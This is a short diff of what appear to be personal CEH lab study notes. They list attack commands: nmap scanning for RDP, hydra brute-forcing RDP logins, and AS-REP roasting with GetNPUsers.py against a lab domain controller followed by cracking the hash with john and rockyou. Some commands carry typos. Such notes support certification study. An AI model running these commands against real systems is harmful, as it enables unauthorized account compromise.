@@ -62,3 +62,8 @@ filter as mqtt and see the public message and then go to down panel open and see
 RDP ->
 Sudo nmap -p 3389 <IP/24>
 hydra-l <username> -P </path to password wordlist.txt> <IP> RDP
+
+AD -->
+pyhon3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtool/user.txt -dc-ip 10.10.1.12
+john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
+
